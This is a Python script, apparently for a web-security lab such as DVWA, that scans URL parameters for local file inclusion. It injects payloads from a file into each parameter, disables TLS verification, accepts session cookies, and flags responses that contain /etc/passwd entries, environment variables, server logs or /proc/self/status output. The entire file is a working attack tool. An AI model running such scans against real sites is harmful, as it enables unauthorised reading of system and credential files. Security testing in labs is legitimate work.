#Usage : http://127.0.0.1/vulnerabilities/fi/?page=any_value
#Usage : http://127.0.0.1/vulnerabilities/fi/?page=any_value&page2=any_value&page3=any_value&page4=*

import sys
import requests
import urllib.parse 


def scanner(link):
	print("LFI Scan Running")
	path = "payloads/pathforlfi.txt"
	file = open(path, "r")

	domain = urllib.parse.urlparse(link)
	params = urllib.parse.parse_qsl(domain.query)
	url = domain.scheme + "://" + domain.netloc + domain.path
	i=0
	text = "testparameter"

	if domain.query == '':
	    print("No parameters to check.")
	    print("Format of usage: https://domain.com/path?parameter=random_value")
	    exit()
	else:
	    for par in params:
	        i=i+1
	        if len(params) == 1:
	            url = url + par[0] + "=" + text
	        elif len(params) == i:
	            url = url + par[0] + "=" + text
	        else:
	            url = url + par[0] + "=" + text + "&"
	    domain = url
	cookie_value = input("Please Add Cookies if URL is after authentication (format name=value) : ")
	hearders = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
                'Cookies':cookie_value}
	print(hearders)
	for line in file.readlines():
	    c = line.strip('\n')
	    if "*" in link:
	        website = link.replace("*" , c)
	    else:
	        website = domain.replace("testparameter" , c)
	    status_code = 500
	    try:
	    	r = requests.get(website, headers=hearders, timeout=7, verify=False) 
	    	content = r.content.__str__()
	    	status_code = 200
	    except:
	        content = ""
	        pass
	    if(status_code == 200):
	        #print(website)
	        if ("[<a href='function.main'>function.main</a>" not in content
	        	and "[<a href='function.include'>function.include</a>" not in content
	        	and ("Failed opening" not in content and "for inclusion" not in content)
	        	and "failed to open stream:" not in content
	        	and "open_basedir restriction in effect" not in content
	        	and ("root:" in content or ("sbin" in content and "nologin" in content)
	            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content
	            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
	            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
	            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
	            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
	            or ("error]" in content and "[client" in content and "log" in website)
	            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
	            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
	            	and "/proc/self/status" in website))):
	            print("Vulnerable")
	            print(website)
	            break
	print("Check for LFI completed")


domain = "http://127.0.0.1/vulnerabilities/fi/?page=*"
scanner(domain)




